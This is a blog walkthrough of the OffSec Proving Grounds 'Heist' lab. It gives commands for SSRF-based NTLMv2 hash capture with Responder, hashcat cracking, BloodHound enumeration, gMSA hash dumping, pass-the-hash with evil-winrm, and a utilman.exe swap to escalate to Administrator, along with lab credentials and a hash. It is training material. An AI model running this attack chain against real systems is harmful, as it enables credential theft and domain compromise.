---
title: Heist
date: 2026-04-01T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - updog
  - SeRestorePrivilege
  - evilwinrm
  - redirect
  - Hashcat
  - smbclient
  - enum4linux-ng
  - nxc
  - GMSA
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Heist"
---
“All things change in a dynamic environment. Your effort to remain what you are is what limits you.”  
-Puppet Master

This guide is to help trigger your mind. Train your brain to look sideways for answers, peak don't follow.

I had some help, I will admit that I read the discription on the lab. It hints that I can use a ssrf attack to leak ntlmv2 credentials via responder. Its pretty obvious now that I think about it because the url is linking to another site. These labs need to tell you which direction to head in.

Think about what the purpose of the site is. 

`nmap 192.168.249.165 -p-  --min-rate 5000 > nmapf.txt`

![](Screenshot%202026-04-01%20at%2009.25.37.png)

8080!!

![](Screenshot%202026-04-01%20at%2009.29.40.png)

![](Screenshot%202026-04-01%20at%2009.51.30.png)
 
 I had a quick read of this:   
 `https://medium.com/@shubhamsonani/leaking-netntlm-hashes-via-ssrf-using-unc-paths-windows-9c37e17b5041`

I tried both url paths suggested in the post....

![](Screenshot%202026-04-01%20at%2009.55.17.png)

 `sudo responder -I tun0`

![](Screenshot%202026-04-01%20at%2009.25.02.png)

![](Screenshot%202026-04-01%20at%2009.52.41.png)


![](Screenshot%202026-04-01%20at%2009.24.38.png)

`hashcat -m 5600  enox /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat`

![](Screenshot%202026-04-01%20at%2009.24.06.png)

![](Screenshot%202026-04-01%20at%2009.23.40.png)

![](Screenshot%202026-04-01%20at%2009.20.38.png)

Bloodhound is incredible at giving escalation hints:  
`bloodhound-python -u "enox" -p 'california' -d heist.offsec -c all --zip -ns 192.168.249.165`

![](Screenshot%202026-04-01%20at%2011.46.54.png)


`evil-winrm -i 192.168.242.172 -u "enox"  -p "california"`

![](Screenshot%202026-04-01%20at%2011.48.43.png)

`whoami`  
`net user enox`

![](Screenshot%202026-04-01%20at%2011.51.47.png)


Love bloodhound:

![](Screenshot%202026-04-02%20at%2008.47.21.png)

There are many ways to dump GMSA credentials, I found that nxc is the easiest

`sudo nxc ldap 192.168.107.165 -u enox -p california --gmsa`

NTLM: 037ae0a6176eb04fd4c7aeceb0c4327e

![](Screenshot%202026-04-01%20at%2014.10.00.png)

OR:

Downlaod this tool:  
https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe


 `.\GMSAPasswordReader.exe --accountname svc_apache$`

![](Screenshot%202026-04-01%20at%2014.58.41.png)

`evil-winrm -i 192.168.107.165 -u svc_apache$ -H 037AE0A6176EB04FD4C7AECEB0C4327E`

If for some reason this doesn't work, restart the lab. This is definately the correct hash.

![](Screenshot%202026-04-02%20at%2006.38.45.png)

SeRestorePrivilege:

![](Screenshot%202026-04-02%20at%2006.44.30.png)

`https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information`

![](Screenshot%202026-04-02%20at%2010.13.30.png)

`move utilman.exe utilman.exe.bak`  
`move cmd.exe utilman.exe`

![](Screenshot%202026-04-02%20at%2008.11.25.png)

Log into the victim machine via rdesktop:  
`rdesktop  192.168.107.165`

Hit the windows key + u, and you'll see a popup cmd...

![](Screenshot%202026-04-02%20at%2008.14.31.png)

I struggled to copy paste the flag so I added another user to the admin group.

`net localgroup Administrators enox /add

![](Screenshot%202026-04-02%20at%2008.02.05.png)

Signed back in as enox:  
`evil-winrm -i 192.168.107.165 -u enox -p california`

![](Screenshot%202026-04-02%20at%2008.20.31.png)